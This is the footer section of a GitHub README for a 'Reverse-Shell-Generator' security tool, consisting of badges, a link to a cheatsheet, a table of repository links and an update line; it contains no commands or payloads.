![Python](https://img.shields.io/badge/Made%20with-Python-yellow?logo=python)
![Security](https://img.shields.io/badge/Security-Educational-red?logo=security)
![CTF](https://img.shields.io/badge/Use%20Case-CTF%20%7C%20Pentesting-purple?logo=hackthebox)

**[📚 View Complete Cheatsheet →](CHEATSHEET.md)** | **[⬆ Back to Top](#-reverse-shell-generator)**

---

### 🔗 Quick Links

| 📚 **Resource** | 🔗 **Link** |
|:---|:---|
| **📄 CHEATSHEET.md** | [View Complete Reference](CHEATSHEET.md) |
| **🐛 Report Bug** | [GitHub Issues](https://github.com/dustin04x/Reverse-Shell-Generator/issues) |
| **💡 Feature Request** | [GitHub Discussions](https://github.com/dustin04x/Reverse-Shell-Generator/discussions) |
| **📖 Documentation** | [Wiki Pages](https://github.com/dustin04x/Reverse-Shell-Generator/wiki) |

</div>

---

*Last updated: December 2025 | Version 2.0 | Author: MiniMax Agent*
